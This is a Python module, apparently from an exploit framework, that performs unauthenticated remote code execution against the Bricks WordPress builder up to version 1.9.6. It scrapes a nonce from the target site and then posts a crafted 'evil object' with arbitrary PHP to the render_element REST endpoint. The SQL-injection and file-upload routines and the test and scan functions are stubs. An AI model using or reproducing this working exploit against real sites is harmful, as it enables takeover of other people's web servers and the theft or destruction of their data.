from helpers import *
import re, requests

##
# Module:       bricks
# Exploit:      1.9.6-rce
# Description:  unauthenticated RCE against bricks version up to 1.9.6

##
# Vulnerabilities   (required)
def get_vuln():
    return ['RCE', 'FILEi', 'SQLi']

##
# Attack            (required)
# Performs the actual attack
# Requires a payload & target

def attack(args, payload):
    # module:   bricks
    # exploit:  1.9.6-rce
    # target:   https://domain.com
    # payload:  smitka-browser

    # Available dependencies
    deps = payload.get_dep()
    for dep in deps:
        if dep in get_vuln():
            pwarn("Detonating with:", dep)
            detonate(payload, dep, args)
            exit()

##
# Detonate the payload      (optional)
def detonate(payload, vuln, args):
    if vuln == 'RCE':
        phps = payload.detonate(vuln)
        for php in phps:
            execute_php(php, args)

    if vuln == 'FILEi':
        files = payload.detonate(vuln)
        for file in files:
            upload_file(file, args)


    elif vuln == 'SQLi':
        sqls = payload.detonate(vuln)
        for sql in sqls:
            execute_sql(sql, args)


def execute_php(php, args):
    pwarn("Executing PHP:",php)

    # Get nonce
    html = requests.get(args.target)
    nonce_match = re.search('nonce":"(.*?)",', str(html.text))
    if nonce_match is None:
        perror("Cannot find nonce")
        exit()
    nonce = nonce_match.group(1)

    #Evil Object
    evil_obj = {
        'nonce': nonce,
        'postId': '1234',
        'action': 'bricks_render_element',
        'element': {
            'id': 'ahavrd',
            'name': 'code',
            'settings': {
                'code': php,
                'executeCode': True
            }
        }
    }

    #Send
    url = args.target + "/wp-json/bricks/v1/render_element"
    res = requests.post(url, json=evil_obj)
    if res.status_code == 200:
        psuccess(res.text)
    else:
        perror(res.text)
        perror("=== There was an error ===")

def execute_sql(sql, args):
    psuccess("Executing SQL:",sql)

def upload_file(file, args):
    psuccess("Uploading file:", file)
    psuccess("Uploaded:", args.target + "/" + os.path.basename(file))

##
# Test
# Perform tests against target to determine if vulnerable
# This is very similar to attack() however the payload should
# be self descruct/non persistant and return true/false
# No false positives are accepted here

def test(args):
    print("Performing tests")


##
# Scan
# Perform a scan against the target to determine if it
# _might_ be vulnerable. ie checking versions.
# No actual exploit is done during scan
# False positives are accepted.

def scan(args):
    print("Performing scan")


##
# Help
# Display help text

def help():
    print("This is the help")
